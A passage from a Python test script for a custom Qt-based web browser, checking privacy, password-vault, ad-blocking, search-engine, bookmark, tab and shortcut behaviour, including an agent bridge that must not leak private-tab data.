        _ok106 = br.certificate_error(_CertErr106(), private=True)
    except TypeError:
        _ok106 = False
finally:
    B.QMessageBox.question = _q106
    br.certificate_for = _cf106
check("a certificate trusted in a private tab is not written to the config",
      _ok106 and json.dumps(br.certificate_exceptions()) == _ce106,
      str((_ok106, "private106.example" in br.certificate_exceptions())))

# ===== fifth pass, part 2: agent bridge, vault, downloads, bookmarks =====
import agent_bridge as _AB107
_ab107 = _AB107.AgentBridge(br)
_out107 = []
_ab107._reply = lambda conn, payload: _out107.append(payload)
_fp107 = br.new_tab(url=srv.url("/twhome?up=1"), switch=False)
H.wait_for(lambda: "/twhome" in _fp107.url().toString(), 8000)
_pg107 = _fp107.page()
_pg107._agent_files = ["/etc/hostname"]
_pg107._agent_files_for = ("other107.example", B.time.monotonic())
try:
    _got107 = _pg107._agent_files_take()
    _pg107._agent_files = ["/etc/hostname"]
    _pg107._agent_files_for = (_fp107.url().host(), B.time.monotonic())
    _mine107 = _pg107._agent_files_take()
except AttributeError:
    _got107, _mine107 = ["/etc/hostname"], None
check("files armed for one site are not handed to another site's chooser",
      _got107 is None and _mine107 == ["/etc/hostname"],
      str((_got107, _mine107)))
br.close_tab(br.tabs.indexOf(_fp107), ask=False)
_bm_n107 = len(br.bookmarks)
_pb107 = br.new_tab(url=srv.url("/twhome?privbm=1"), switch=True,
                    private=True)
H.wait_for(lambda: "/twhome" in _pb107.url().toString(), 8000)
_ab107.op_bookmarks(None, {"action": "add"})
_bm_after107 = len(br.bookmarks)
br.close_tab(br.tabs.indexOf(_pb107), ask=False)
check("the bridge never bookmarks a private tab", _bm_after107 == _bm_n107,
      str((_bm_n107, _bm_after107, _out107[-1:])))
_audit107 = json.dumps(br.config.get("bridgeAudit") or [])
_lv107 = br.config.get("bridgeLevel", "__absent__")
br.config["bridgeLevel"] = "off"
_ab107._dispatch(None, json.dumps({
    "op": "open", "url": "https://secret107.example/?token=abc",
    "private": True}).encode())
_rows107 = json.dumps(br.config.get("bridgeAudit") or [])
if _lv107 == "__absent__":
    br.config.pop("bridgeLevel", None)
else:
    br.config["bridgeLevel"] = _lv107
br.config["bridgeAudit"] = json.loads(_audit107)
check("the audit log never writes a private open's address",
      "secret107" not in _rows107, _rows107[-160:])
_macros107 = json.dumps(br.config.get("macros") or {})
br.config["macros"] = {"login107": [{"op": "click", "selector": "#a"}]}
_ab107.macro = {"tab": None, "steps": [], "private": False}
_ab107._macro_rows = lambda: []
_ab107._find = lambda tab: _mv107
_mv107 = br.new_tab(url=srv.url("/twhome?mac=1"), switch=False)
H.wait_for(lambda: "/twhome" in _mv107.url().toString(), 8000)
del _out107[:]
_ab107.op_macro(None, {"do": "stop", "name": "login107"})
H.wait_for(lambda: bool(_out107), 5000)
_kept107 = (br.config.get("macros") or {}).get("login107")
br.config["macros"] = json.loads(_macros107)
br.close_tab(br.tabs.indexOf(_mv107), ask=False)
check("stopping a macro after the page moved on keeps the saved one",
      _kept107 == [{"op": "click", "selector": "#a"}], str(_kept107))
_vl107 = []
_real_lv107 = br.lock_vault
br.lock_vault = lambda: _vl107.append(1) or True
try:
    if br.vault_lock.enabled():
        br.lock_vault_now()
        _lock_ok107 = _vl107 == [1]
    else:
        _lock_ok107 = True
finally:
    br.lock_vault = _real_lv107
check("'Lock now' runs the whole lock", _lock_ok107, str(_vl107))
br._pw_attempts = {1: {"at": B.time.monotonic() - 60, "data": {}},
                   2: {"at": B.time.monotonic(), "data": {}}}
try:
    br._prune_attempts()
    _left107 = sorted(br._pw_attempts)
except AttributeError:
    _left107 = [1, 2]
br._pw_attempts = {}
check("a held sign-in attempt older than 30 s is let go", _left107 == [2],
      str(_left107))
_dls107 = list(br.downloads)
_keep107 = br.config.get("dlKeepDays", "__absent__")
br.config["dlKeepDays"] = 7
br.downloads[:] = [{"name": "old107", "state": "done",
                    "t": B.time.time() - 30 * 86400},
                   {"name": "new107", "state": "done", "t": B.time.time()}]
br._dl_cleaned_at = 0
br._schedule_tick()
_names107 = [d.get("name") for d in br.downloads]
br.downloads[:] = _dls107
br.save_downloads()
if _keep107 == "__absent__":
    br.config.pop("dlKeepDays", None)
else:
    br.config["dlKeepDays"] = _keep107
check("finished downloads older than the keep-days leave the list",
      _names107 == ["new107"], str(_names107))
_bms107 = list(br.bookmarks)
_undo107 = (getattr(br, "_bookmark_undo", None),
            getattr(br, "_bookmark_undo_at", None))
_top107 = br.add_bookmark_folder("Top107", 0)
_in107 = br.add_bookmark_folder("Locked107", _top107)
_link107 = (br._add_link("https://locked107.example/", "L", parent=_in107)
            or {}).get("id")
br.lock_folder(_in107, True)
br.remove_bookmark(_top107)
_still107 = br._bookmark_by_id(_in107) is not None
br.update_bookmark(_link107, "renamed107", "https://locked107.example/")
_title107 = (br._bookmark_by_id(_link107) or {}).get("title")
br.bookmarks = _bms107
br.save_bookmarks()
br._bookmark_undo, br._bookmark_undo_at = _undo107
check("a locked folder survives deleting its parent, and its links keep "
      "their names", _still107 and _title107 == "L",
      str((_still107, _title107)))
_dsr107 = br.config.get("darkSiteRules", "__absent__")
br.config["darkSiteRules"] = ["leftalone107.example"]
_th107 = B.theme_web.themes_host(br, "leftalone107.example") \
    if B.theme_web.enabled(br) else False
if _dsr107 == "__absent__":
    br.config.pop("darkSiteRules", None)
else:
    br.config["darkSiteRules"] = _dsr107
check("'Sites to leave alone' are not themed", not _th107, str(_th107))
_wv107 = br.new_tab(url=srv.url("/twhome?watch=1"), switch=False)
H.wait_for(lambda: "/twhome" in _wv107.url().toString(), 8000)
_ab107._find = lambda tab: _wv107
_ab107.watches[107] = {"tab": 1, "selector": "body", "was": None,
                       "changes": 0, "timer": None}
_lv107 = br.config.get("bridgeLevel", "__absent__")
br.config["bridgeLevel"] = "off"
_ab107._watch_tick(107)
_alive107 = 107 in _ab107.watches
_ab107.watches.pop(107, None)
if _lv107 == "__absent__":
    br.config.pop("bridgeLevel", None)
else:
    br.config["bridgeLevel"] = _lv107
br.close_tab(br.tabs.indexOf(_wv107), ask=False)
check("a watch stops once the bridge is switched off", not _alive107,
      str(_alive107))

# ===== sixth pass, part 1: ad lists, engines, print, snooze, keys ========
import adblock as _AD108
_k108, _v108 = _AD108.parse_line("||popads108.example^$popup")
check("a $popup rule is not kept as a rule for every request",
      _k108 == "skip", str((_k108, _v108)))
_rs108 = _AD108.Rules()
# "/banner108/" alone is a regular expression in filter-list syntax (and
# skipped as one): a path rule is written with something after it
_rs108.load_text("/banner108/*\n||ad*.example108.com^\n/ads108/banner.\n")
_doc108 = _rs108.blocks("https://news.example/banner108/story", "",
                        "document")
_img108 = _rs108.blocks("https://news.example/banner108/x.png",
                        "news.example", "image")
_wild108 = _rs108.blocks("https://ad7.example108.com/x.js", "site.example",
                         "script")
_case108 = _rs108.blocks("https://x.example/Ads108/Banner.PNG",
                         "x.example", "image")
check("a rule without $document leaves the page itself alone",
      _doc108 is None and _img108 is not None, str((_doc108, _img108)))
check("a host rule with a wildcard in the host still matches",
      _wild108 is not None, str(_wild108))
check("list rules match whatever the case of the address",
      _case108 is not None, str(_case108))
class _Sig108:
    def connect(self, fn):
        pass


class _Reply108:
    finished = _Sig108()

    def abort(self):
        pass


_os108 = br.new_tab(url=srv.url("/twhome?os=1"), switch=True)
H.wait_for(lambda: "/twhome" in _os108.url().toString(), 8000)
_os108._opensearch = {"name": "Evil", "href": "https://evil108.example/os.xml",
                      "host": "evil108.example"}
_fl108 = []
_real_fl108 = br.flash
br.flash = lambda text, *a, **k: _fl108.append(text)
_nam_got108 = []
br._nam.get = lambda req: _nam_got108.append(req.url().toString()) \
    or _Reply108()
try:
    _off108 = br.offer_opensearch(view=_os108)
finally:
    br.flash = _real_fl108
    br._nam.__dict__.pop("get", None)
br.close_tab(br.tabs.indexOf(_os108), ask=False)
check("another page's search offer is not saved under this site",
      _off108 is False and not _nam_got108, str((_off108, _nam_got108)))
_et108 = br.config.get("enginesText", "__absent__")
_oe108 = json.dumps(br.config.get("ownEngines") or [])
_sk108 = json.dumps(br.config.get("searchKeywords") or {})
_ek108 = br.config.get("engineKeywords", "__absent__")
br.parse_engines("Rev108|https://r108.example/?q=%s|r108")
br.parse_engines("Rev108|https://r108.example/?q=%s|s108")
_kw108 = dict(br.config.get("searchKeywords") or {})
br.add_engine("Added108", "https://a108.example/?q={searchTerms}", "a108")
_txt108 = str(br.config.get("enginesText") or "")
for _k, _v in (("enginesText", _et108), ("engineKeywords", _ek108)):
    if _v == "__absent__":
        br.config.pop(_k, None)
    else:
        br.config[_k] = _v
br.config["ownEngines"] = json.loads(_oe108)
br.config["searchKeywords"] = json.loads(_sk108)
check("a changed engine keyword stops the old one searching",
      "s108" in _kw108 and "r108" not in _kw108, str(sorted(_kw108)[:8]))
check("an engine added from a page stays in the engines text",
      "Added108|" in _txt108, _txt108[-80:])
_se108 = br.config.get("searchEngine", "__absent__")
_ss108 = br.config.get("searchSuggestions", "__absent__")
br.config["searchEngine"] = "duckduckgo"
br.config["searchSuggestions"] = True
_sv108 = br.new_tab(url=srv.url("/twhome?sug=1"), switch=True); H.spin(300)
br._suggest_reply = None
br.urlbar.setText("cats and dogs 108")
br.urlbar.hasFocus = lambda: True


_asked108 = []
_real_nam108 = br._nam.get
br._nam.get = lambda req: _asked108.append(req.url().host()) or _Reply108()
try:
    br._fetch_suggestions()
    _sent108 = bool(_asked108)
except Exception as _e:
    _sent108 = "err " + repr(_e)
finally:
    br.urlbar.__dict__.pop("hasFocus", None)
    br._nam.__dict__.pop("get", None)
    br._suggest_reply = None
for _k, _v in (("searchEngine", _se108), ("searchSuggestions", _ss108)):
    if _v == "__absent__":
        br.config.pop(_k, None)
    else:
        br.config[_k] = _v
br.urlbar.setText("")
br.close_tab(br.tabs.indexOf(_sv108), ask=False)
check("with DuckDuckGo chosen nothing typed goes to Google's suggestions",
      _sent108 is False, str(_sent108))
_sz108 = json.dumps(br.config.get("snoozed") or [])
br.config["snoozed"] = [{"url": srv.url("/twhome?snz=1"),
                         "at": B.time.time() - 5},
                        {"url": srv.url("/twhome?snz=2"),
                         "at": B.time.time() + 9999}]
_before108 = br.tabs.count()
br._desk_tick(); H.spin(300)
_woke108 = br.tabs.count() - _before108
try:
    _all108 = br.wake_snoozed(everything=True)
except TypeError:
    _all108 = 0
H.spin(300)
for _i in reversed(range(br.tabs.count())):
    _w = br.tabs.widget(_i)
    if _w is not None and not br._is_header(_w) \
            and "snz=" in (getattr(_w, "_requested", "") or
                           _w.url().toString()):
        br.close_tab(_i, ask=False)
br.config["snoozed"] = json.loads(_sz108)
check("a snoozed tab wakes while the browser runs, and the menu wakes all",
      _woke108 == 1 and _all108 == 1, str((_woke108, _all108)))
_la108 = getattr(br, "_last_action", None)
br._last_action = "keyrepeat"
_rep108 = br.repeat_last_action()
br._last_action = _la108
check("'repeat last action' never repeats itself", _rep108 == "",
      str(_rep108))
_mb108 = br.config.get("mouseButtons", "__absent__")
_eb108 = br.config.get("extraButtons", "__absent__")
br.config["mouseButtons"] = False
br.set_button_action("XButton3", "reload")
_tab108 = br.button_actions()
_mb_after108 = br.config.get("mouseButtons")
for _k, _v in (("mouseButtons", _mb108), ("extraButtons", _eb108)):
    if _v == "__absent__":
        br.config.pop(_k, None)
    else:
        br.config[_k] = _v
check("the side-button switch and the button table do not overwrite each other",
      _tab108.get("XButton3") == "reload" and _mb_after108 is False,
      str((_tab108, _mb_after108)))
_pt108 = []
_real_pt108 = br.play_tool
br.play_tool = lambda name, view=None, then=None, arg=None: (
    _pt108.append((name, view, arg)) or True)
_gp108 = br.config.get("gamepadOn", "__absent__")
_ga108 = br.new_tab(url=srv.url("/twhome?pad=1"), switch=False); H.spin(200)
try:
    br.gamepad(on=False)
finally:
    br.play_tool = _real_pt108
    if _gp108 == "__absent__":
        br.config.pop("gamepadOn", None)
    else:
        br.config["gamepadOn"] = _gp108
br.close_tab(br.tabs.indexOf(_ga108), ask=False)
check("the gamepad switch reaches every tab, not only the one in front",
      any(v is _ga108 and a is False for n, v, a in _pt108), str(len(_pt108)))
_dup108 = [s for s in br.findChildren(B.QShortcut)
           if s.key().toString() == B.QKeySequence("Ctrl++").toString()]
check("Ctrl++ is bound once, not twice (Qt fires neither)",
      len(_dup108) <= 1, str(len(_dup108)))

# ===== sixth pass, part 2: notes, translator, spelling, nav, tabs, keys ==
_pn109 = [B.notes.parse_note(t) for t in (
    "---\nmy text", "---\ntitle: x\nsome text\n---\nmore",
    "---\ntitle: T\ndate: 2026\n---\nbody")]
check("a note that only starts with --- keeps all its text",
      _pn109[0]["body"] == "---\nmy text"
      and _pn109[1]["body"].startswith("---\ntitle: x\nsome text"),
      str([p["body"][:20] for p in _pn109]))
check("a note's own front-matter keys are written back on save",
      "date: 2026" in B.notes.note_text(_pn109[2]),
      B.notes.note_text(_pn109[2])[:60])
_tr109 = {}
_real_ct109 = br.caption_tools
br.caption_tools = lambda: {"captionTranslator": "~/no-such-translator-109"}
try:
    br.run_translator("hello", then=lambda out: _tr109.update(v=out))
    H.wait_for(lambda: "v" in _tr109, 5000)
finally:
    br.caption_tools = _real_ct109
check("a translator that cannot start answers instead of stalling",
      _tr109.get("v") == "", str(_tr109))
_sl109 = (br.config.get("spellLangs", "__absent__"),
          br.config.get("spellBoth", "__absent__"))
_real_sd109, _real_as109 = br.spell_dictionaries, br.apply_spellcheck
br.spell_dictionaries = lambda: ["de-DE", "en-US"]
br.apply_spellcheck = lambda *a, **k: None
try:
    br.spell_both_languages(True)
    _on109 = list(br.config.get("spellLangs") or [])
    br.spell_both_languages(False)
    _off109 = list(br.config.get("spellLangs") or [])
finally:
    br.spell_dictionaries, br.apply_spellcheck = _real_sd109, _real_as109
for _k, _v in zip(("spellLangs", "spellBoth"), _sl109):
    if _v == "__absent__":
        br.config.pop(_k, None)
    else:
        br.config[_k] = _v
check("spelling in two languages finds Qt's de-DE/en-US and switches off",
      _on109 == ["de-DE", "en-US"] and _off109 == [], str((_on109, _off109)))
_nv109 = br.new_tab(url=srv.url("/twhome?nav=1"), switch=False)
H.wait_for(lambda: "/twhome" in _nv109.url().toString(), 8000)
_off_was109 = br.config.get("offline", False)
br.config["offline"] = True
_pg109 = _nv109.page()
_pg109._main_nav_url = B.QUrl(srv.url("/twhome?nav=1"))
try:
    _pg109.acceptNavigationRequest(
        B.QUrl("http://refused109.example/"),
        B.QWebEnginePage.NavigationType.NavigationTypeLinkClicked, True)
finally:
    br.config["offline"] = _off_was109
_mn109 = _pg109._main_nav_url.toString()
check("a refused navigation does not vouch for that host's login box",
      "refused109" not in _mn109, _mn109)
_mt109 = []
_real_mu109, _real_om109 = br.mailto_url, br.open_mailto
br.mailto_url = lambda m: "https://mail.example/compose"
br.open_mailto = lambda m, v=None: _mt109.append(m)
try:
    _pg109.acceptNavigationRequest(
        B.QUrl("mailto:a@b.example"),
        B.QWebEnginePage.NavigationType.NavigationTypeRedirect, True)
    _script109 = len(_mt109)
    _pg109.acceptNavigationRequest(
        B.QUrl("mailto:a@b.example"),
        B.QWebEnginePage.NavigationType.NavigationTypeLinkClicked, True)
    _click109 = len(_mt109) - _script109
finally:
    br.mailto_url, br.open_mailto = _real_mu109, _real_om109
br.close_tab(br.tabs.indexOf(_nv109), ask=False)
check("a mailto from a redirect opens no compose tab; a click does",
      _script109 == 0 and _click109 == 1, str((_script109, _click109)))
_ga109 = br.new_tab(url=srv.url("/twhome?anc=1"), switch=False); H.spin(200)
_gb109 = br.new_tab(url=srv.url("/twhome?anc=2"), switch=False); H.spin(200)
br.toggle_tab_selection(br.tabs.indexOf(_ga109))
br.close_tab(br.tabs.indexOf(_ga109), ask=False)
H.spin(300)
_err109 = ""
try:
    br.select_tab_range(br.tabs.indexOf(_gb109))
except RuntimeError as _e:
    _err109 = repr(_e)
br.clear_tab_selection()
check("shift-click after the anchor tab was closed does not raise",
      not _err109, _err109)
_pin109 = br.new_tab(url=srv.url("/twhome?pin109=1"), switch=False)
H.spin(200)
br._register_group("G109", "#cba6f7")
br._move_tab_to_group(br.tabs.indexOf(_gb109), "G109")
_gc109 = br.new_tab(url=srv.url("/twhome?anc=3"), switch=False,
                    group="G109"); H.spin(200)
br.pin_tab(br.tabs.indexOf(_pin109), True)
br._drag_view = _pin109
br.tabs.tabBar().moveTab(br.tabs.indexOf(_pin109), br.tabs.indexOf(_gc109))
H.spin(100)
_pg_g109 = getattr(_pin109, "group", None)
br._drag_view = None
br.pin_tab(br.tabs.indexOf(_pin109), False)
for _w in (_pin109, _gb109, _gc109):
    _close_if_open(_w)
H.spin(200)
check("a pinned tab dragged into a group stays out of it",
      _pg_g109 is None, str(_pg_g109))


class _Rail109:
    browser = br
    folded = False


_fp_a109 = B.TabSidebar.fingerprint(_Rail109())
_gcol109 = dict(br.group_colors)
br.group_colors["Rail109"] = "#123456"
_fp_b109 = B.TabSidebar.fingerprint(_Rail109())
br.group_colors.clear()
br.group_colors.update(_gcol109)
check("the tab rail notices a group colour change", _fp_a109 != _fp_b109)
_re109 = br._plugin_pattern_to_regex("<all_urls>")
check("@match <all_urls> matches a web page",
      bool(B.re.match(_re109, "https://x109.example/a")), _re109)
_said109 = []


class _Desk109:
    rows = []

    def due_todos(self):
        return list(self.rows)


_d109 = _Desk109()
_real_desk109, _real_fl109 = br.desk, br.flash
_real_nd109 = br.notify_desktop
br.desk = lambda: _d109
br.flash = lambda text, *a, **k: _said109.append(text)
br.notify_desktop = lambda *a, **k: None
_ts109 = getattr(br, "_todo_said", {})
br._todo_said = {}
try:
    _d109.rows = [{"id": 5, "text": "first109", "due": 1, "done": False}]
    br._desk_tick()
    _d109.rows = [{"id": 5, "text": "second109", "due": 2, "done": False}]
    br._desk_tick()
    br._desk_tick()
finally:
    br.desk, br.flash, br.notify_desktop = (_real_desk109, _real_fl109,
                                             _real_nd109)
    br._todo_said = _ts109
_todo_lines109 = [t for t in _said109 if "109" in t]
check("a to-do reminder is not swallowed by another one's line number",
      len(_todo_lines109) == 2 and "second109" in _todo_lines109[-1],
      str(_todo_lines109))
_sc109 = br.config.get("shortcuts", "__absent__")
try:
    br.bridge.setSetting("shortcuts", json.dumps({"newtab": "Ctrl+Alt+F9"}))
    _keys109 = [s.key().toString() for s in br.findChildren(B.QShortcut)
                if s.isEnabled()]
finally:
    if _sc109 == "__absent__":
        br.config.pop("shortcuts", None)
    else:
        br.config["shortcuts"] = _sc109
    try:
        br.rebind_shortcuts()
    except AttributeError:
        pass
check("a key changed in Settings works without a restart",
      B.QKeySequence("Ctrl+Alt+F9").toString() in _keys109,
      str(len(_keys109)))

# ===== fifth pass, part 3: 1Password secrets come from a worker ==========
class _Prov110:
    eager = False
    name = "1password"


class _Vault110:
    provider = _Prov110()
    asked = []

    def reveal(self, item_id, field):
        self.asked.append((item_id, field))
        return "pw110"


_real_vault110 = br.vault
_got110 = {}
br.vault = _Vault110()
try:
    try:
        br._with_password({"id": "op110", "username": "u", "password": ""},
                          lambda pw: _got110.update(v=pw))
        H.wait_for(lambda: "v" in _got110, 8000)
    except AttributeError:
        pass
finally:
    br.vault = _real_vault110
check("a 1Password login's password is fetched for the fill, not left empty",
      _got110.get("v") == "pw110", str(_got110))

# ===== fifth/sixth pass lows: macros, downloads, notes, ads, keys, styles ==
import agent_bridge as _AB111
_ab111 = _AB111.AgentBridge(br)
_out111 = []
_ab111._reply = lambda conn, payload: _out111.append(payload)
_ab111.op_macro(None, {"do": "play", "steps": [{"op": "click",
                                                "selector": "#a"}, "oops"]})
check("a macro with a malformed step is refused with a reply",
      _out111 and _out111[-1].get("error") == "bad-steps", str(_out111[-1:]))
_dd111 = _Path(_tempfile.mkdtemp(dir=str(B.CONFIG_FILE.parent)))
(_dd111 / "same111.txt").write_text("newer download")
_dls111 = list(br.downloads)
br.downloads[:] = [
    {"id": "old111", "name": "same111.txt", "dir": str(_dd111),
     "state": "cancelled", "t": 1},
    {"id": "new111", "name": "same111.txt", "dir": str(_dd111),
     "state": "done", "t": 2}]
br.forget_download("old111", from_disk=True, ask=False)
_kept111 = (_dd111 / "same111.txt").exists()
br.downloads[:] = _dls111
br.save_downloads()
check("deleting an old row's file leaves a newer download's file alone",
      _kept111, str(_kept111))
if br.desk() is not None:
    br.desk()._clips = ["clip111"]
    br.set_notes_folder(br.config.get("notesFolder") or "")
    _clips111 = list(getattr(br.desk(), "_clips", []))
    check("saving the notes folder unchanged keeps the clipboard history",
          _clips111 == ["clip111"], str(_clips111))
    br.desk()._clips = []
import adblock as _AD111
_rs111 = _AD111.Rules()
_rs111.load_text("##.generic111\nsite111.example##.own111\n")
_hide111 = _rs111.hide_for("site111.example")
check("a site's own hiding rules come first, before the generic ones",
      _hide111[:1] == [".own111"], str(_hide111))
_sc111 = br.config.get("shortcuts", "__absent__")
br.config["shortcuts"] = {"zoomin": "Ctrl+Alt+F8"}
try:
    br.rebind_shortcuts()
    _zk111 = [s.key().toString() for s in br.findChildren(B.QShortcut)
              if s.isEnabled()]
except AttributeError:
    _zk111 = [B.QKeySequence("Ctrl++").toString()]
finally:
    if _sc111 == "__absent__":
        br.config.pop("shortcuts", None)
    else:
        br.config["shortcuts"] = _sc111
    try:
        br.rebind_shortcuts()
    except AttributeError:
        pass
check("a rebound zoom key no longer leaves Ctrl++ zooming",
      B.QKeySequence("Ctrl+Alt+F8").toString() in _zk111
      and _zk111.count(B.QKeySequence("Ctrl+Shift++").toString()) == 0,
      str(len(_zk111)))
_ran111 = []
_cov111 = getattr(br, "_lock_cover", None)
br._lock_cover = object()
try:
    try:
        br._palette_run({"id": "history", "run": lambda: _ran111.append(1),
                         "pane": False})
    except AttributeError:
        _ran111.append("old")
finally:
    br._lock_cover = _cov111
check("an action picked in the palette does not run behind the lock",
      _ran111 == [], str(_ran111))
_ss111 = json.dumps(br.config.get("siteStyles") or {})
br.config["siteStyles"] = {"example111.com": "a{}",
                           "blog.example111.com": "b{}"}
_sv111 = br.new_tab(url=srv.url("/twhome?style=1"), switch=False)
H.wait_for(lambda: "/twhome" in _sv111.url().toString(), 8000)
_js111 = []
_sv111.page().runJavaScript = lambda code, *a: _js111.append(code)
try:
    br.apply_site_style(_sv111, url=B.QUrl("https://blog.example111.com/x"))
finally:
    _sv111.page().__dict__.pop("runJavaScript", None)
br.config["siteStyles"] = json.loads(_ss111)
br.close_tab(br.tabs.indexOf(_sv111), ask=False)
check("the most specific site stylesheet is the one applied",
      _js111 and '"b{}"' in _js111[-1], str(_js111[-1:])[:80])

# ===== lows, part 2: list separators, sites, engines, bookmarks, 1Password ==
import adblock as _AD112
_rs112 = _AD112.Rules()
_rs112.load_text("||cdn112.example/ad^\n||static112.example.com^$third-party\n")
check("'^' in a list rule is a separator, not a prefix",
      _rs112.blocks("https://cdn112.example/ads-good/app.js", "x.example",
                    "script") is None
      and _rs112.blocks("https://cdn112.example/ad/x.js", "x.example",
                        "script") is not None)
check("a sibling subdomain is the same site, not a third party",
      _rs112.blocks("https://static112.example.com/x.js",
                    "m.example.com",
                    "script") is None)
_ost112 = json.dumps(br.opensearch_table() or {})
_own112 = json.dumps(br.config.get("ownEngines") or [])
_et112 = br.config.get("enginesText", "__absent__")
br.note_opensearch("dup112.example", "Dup",
                   "https://dup112.example/s?q={searchTerms}&l={language?}")
br.add_engine("Dup", "https://dup112.example/s?q={searchTerms}",
              engine_id="dup112.example")
_rows112 = [r for r in br.all_engines() if r["id"] == "dup112.example"]
_tpl112 = (br.opensearch_table().get("dup112.example") or {}).get("url", "")
br.config["openSearch"] = json.loads(_ost112)
br.config["ownEngines"] = json.loads(_own112)
if _et112 == "__absent__":
    br.config.pop("enginesText", None)
else:
    br.config["enginesText"] = _et112
check("a site's own engine is listed once, with no stray {param}",
      len(_rows112) == 1 and "{language" not in _tpl112,
      str((len(_rows112), _tpl112)))
_bms112 = list(br.bookmarks)
_f112 = br.add_bookmark_folder("Lock112", 0)
_l112 = (br._add_link("https://l112.example/", "L112", parent=0)
         or {}).get("id")
br.lock_folder(_f112, True)
_sig112 = []
br.bridge.bookmarksChanged.connect(lambda: _sig112.append(1))
br.move_bookmark(_l112, _f112, 0)
H.spin(100)
_moved112 = (br._bookmark_by_id(_l112) or {}).get("parent")
br.bookmarks = _bms112
br.save_bookmarks()
check("a move into a locked folder is refused and the page is told",
      _moved112 == 0 and len(_sig112) >= 1, str((_moved112, _sig112)))


class _Prov112:
    eager = False


class _Vault112:
    provider = _Prov112()

    def is_never(self, host):
        return False

    def get(self, host, username):
        return {"id": "op112", "username": username, "password": ""}

    def reveal(self, item_id, field):
        return "same112"

    def touch(self, host, username):
        _touched112.append(username)


_touched112, _asked112 = [], []
_real_v112, _real_pp112 = br.vault, br._password_prompt
_real_lk112 = br.vault_locked
_real_vpo112 = br.vault_password_on
_sp_was112 = br.config.get("savePasswords", "__absent__")
br.vault = _Vault112()
br.vault_locked = lambda: False
# saving switched on for this check: an earlier section can leave either
# switch off, and then nothing is compared at all
br.vault_password_on = lambda: True
br.config["savePasswords"] = True
br._password_prompt = lambda *a, **k: _asked112.append(a)
_pv112 = br.new_tab(url=srv.url("/twhome?op=1"), switch=False)
H.wait_for(lambda: "/twhome" in _pv112.url().toString(), 8000)
try:
    br._password_submitted(_pv112.page(), {
        "host": _pv112.url().host(), "username": "u112",
        "password": "same112"})
    H.wait_for(lambda: _touched112 or _asked112, 5000)
finally:
    br.vault, br._password_prompt = _real_v112, _real_pp112
    br.vault_locked = _real_lk112
    br.vault_password_on = _real_vpo112
    for _n112 in ("vault_password_on", "vault_locked", "_password_prompt"):
        br.__dict__.pop(_n112, None)
    if _sp_was112 == "__absent__":
        br.config.pop("savePasswords", None)
    else:
        br.config["savePasswords"] = _sp_was112
br.close_tab(br.tabs.indexOf(_pv112), ask=False)
check("signing in with the saved 1Password password asks nothing",
      _touched112 == ["u112"] and not _asked112,
      str((_touched112, _asked112)))
_mic112 = (_Path(B.__file__).parent / "mictest.html").read_text()
check("Record waits for the microphone and never runs two recorders",
      "await micStarting" in _mic112 and "const mine = recorder" in _mic112)

# ===== lows, part 3: history bookmarks, Clear all, CSV import twice =======
_bm_n113 = len(br.bookmarks)
_made113 = br.bridge.bookmarkHistoryUrls(json.dumps(["file:///etc/x",
                                                     "javascript:1"]))
check("bookmarking only non-web history rows makes no empty folder",
      _made113 == 0 and len(br.bookmarks) == _bm_n113,
      str((_made113, len(br.bookmarks) - _bm_n113)))
_hist113 = list(br.history)
br.history.append({"url": "https://hist113.example/", "title": "Hist 113",
                   "t": B.time.time()})
_bms113 = list(br.bookmarks)
br.bridge.bookmarkHistoryUrls(json.dumps(["https://hist113.example/"]))
_t113 = [e.get("title") for e in br.bookmarks
         if e.get("url") == "https://hist113.example/"]
br.bookmarks = _bms113
br.save_bookmarks()
check("a history row bookmarked keeps its page title",
      _t113 == ["Hist 113"], str(_t113))
_n113 = br.bridge.clearHistory()
br.history[:] = _hist113
br.save_history()
check("Clear all reports how many entries it cleared",
      isinstance(_n113, int) and _n113 == len(_hist113) + 1, str(_n113))
_vd113 = _Path(_tempfile.mkdtemp(dir=str(B.CONFIG_FILE.parent)))
_pv113 = B.PasswordVault(_vd113)
_csv113 = "name,url,username,password\nEx,https://ex113.example,u,p1\n"
_pv113.import_rows(_csv113)
_pv113.import_rows(_csv113)
_rows113 = [i for i in _pv113.items() if "ex113" in str(i.get("host"))]
check("the same CSV imported twice leaves one login, not two",
      len(_rows113) == 1, str(len(_rows113)))

# ===== lows, part 4: allowed popups, text zoom in divs ====================
_pp114 = br.new_tab(url=srv.url("/twhome?pop=1"), switch=False)
H.wait_for(lambda: "/twhome" in _pp114.url().toString(), 8000)
_rules114 = json.dumps(br.config.get("popupSites") or [])
_real_pa114 = br.popups_allowed_for
br.popups_allowed_for = lambda url: True
try:
    _pp114.page().acceptNavigationRequest(
        B.QUrl(srv.url("/twhome?pop=2")),
        B.QWebEnginePage.NavigationType.NavigationTypeLinkClicked, True)
    _can114 = _pp114.page().settings().testAttribute(
        B.QWebEngineSettings.WebAttribute.JavascriptCanOpenWindows)
finally:
    br.popups_allowed_for = _real_pa114
br.close_tab(br.tabs.indexOf(_pp114), ask=False)
check("a site on the popup allow list may open windows",
      _can114 is True, str(_can114))
_a11y114 = B.A11Y_JS
check("text zoom also reaches text straight in a div or a th",
      "BLOCKS" in _a11y114 and " th," in _a11y114)

# ===== seventh pass: snapshots, backups, awake, forms, cards, gestures ====
_snap115 = json.dumps(br.config.get("tabSnapList") or [])
_nr115 = json.dumps(br.config.get("noRestoreSites") or [])
_sv115 = br.new_tab(url=srv.url("/twhome?snap=1"), switch=False)
H.wait_for(lambda: "/twhome" in _sv115.url().toString(), 8000)
br.config["noRestoreSites"] = [_sv115.url().host()]
br.config["tabSnapList"] = []
br.snapshot_tabs()
_rows115 = [t.get("u") for s in br.config.get("tabSnapList") or []
            for t in s.get("tabs") or []]
br.config["tabSnapList"] = [{"t": 1, "tabs": [{"u": "https://x115.example/"}]}]
br._forget_history_extras(None)
_left115 = br.config.get("tabSnapList")
br.config["tabSnapList"] = json.loads(_snap115)
br.config["noRestoreSites"] = json.loads(_nr115)
br.close_tab(br.tabs.indexOf(_sv115), ask=False)
check("snapshots leave 'never restore' sites out and go with the history",
      not any("snap=1" in str(u) for u in _rows115) and not _left115,
      str((_rows115[:3], _left115)))
_bk115 = []
_real_bn115 = br.vault_backup_now
_bd115 = (br.config.get("vaultBackupDays", "__absent__"),
          br.config.get("vaultBackupLast", "__absent__"))
br.vault_backup_now = lambda *a, **k: _bk115.append(k) or ""
br.config["vaultBackupDays"] = 1
br.config["vaultBackupLast"] = 0
br._backup_tried = -1e9
_items115 = None
try:
    if br.vault is not None and not br.vault_locked():
        _real_items115 = br.vault.items
        br.vault.items = lambda: [{"id": "x"}]
        br._backup_tick()
        br._backup_tick()
